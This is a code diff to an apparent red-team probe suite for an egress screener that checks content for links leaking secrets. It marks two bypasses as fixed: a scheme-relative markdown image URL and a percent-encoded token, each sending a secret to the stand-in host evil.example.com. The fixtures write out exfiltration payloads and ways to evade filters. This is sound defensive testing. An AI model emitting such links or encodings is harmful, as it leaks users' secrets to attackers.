@@ -122,7 +122,9 @@ def _eg_policy():
 def eg01_scheme_relative_bypass():
     """F288: a scheme-relative URL carrying a sensitive token is
     extracted (image-inline) but screened as 'not-external' -> allow.
-    The absolute-URL control is refused. Expected BREAK (open)."""
+    The absolute-URL control is refused. Expected HELD (closed
+    2026-10-01, wave-275 lane A: scheme-relative treated as
+    https-external)."""
     content = ("![x](//evil.example.com/collect?token=%s)" % _EG_SECRET)
     r = egress_refs.screen_egress_refs(content, policy=_eg_policy())
     if r["verdict"] == "allow" and r["code"] is None:
@@ -138,7 +140,9 @@ def eg01_scheme_relative_bypass():
 def eg02_pct_encoded_digest_evasion():
     """F289: percent-encoding the sensitive token defeats the digest
     leg on a DIRECT ref (the relay leg decodes; the direct leg does
-    not). Expected BREAK (open)."""
+    not). Expected HELD (closed 2026-10-01, wave-275 lane A: query
+    form-decoded / fragment decoded, bounded-iterative, before digest
+    tokenization)."""
     enc = "".join("%%%02X" % b for b in _EG_SECRET.encode("utf-8"))
     content = ("![x](https://evil.example.com/collect?token=%s)" % enc)
     r = egress_refs.screen_egress_refs(content, policy=_eg_policy())
@@ -731,10 +735,10 @@ def _green_checks():
 _PROBES = [
     # (id, expected, fn)
     ("pin-taxonomy", "HELD", _pin_check),
-    # egress_refs: F288 / F289 (new breaks).
-    ("eg01-scheme-relative-bypass", "BREAK",
+    # egress_refs: F288 / F289 (closed 2026-10-01, wave-275 lane A).
+    ("eg01-scheme-relative-bypass", "HELD",
      eg01_scheme_relative_bypass),
-    ("eg02-pct-encoded-digest-evasion", "BREAK",
+    ("eg02-pct-encoded-digest-evasion", "HELD",
      eg02_pct_encoded_digest_evasion),
     ("eg03-relay-leg-decodes-inner", "HELD",
      eg03_relay_leg_decodes_inner),
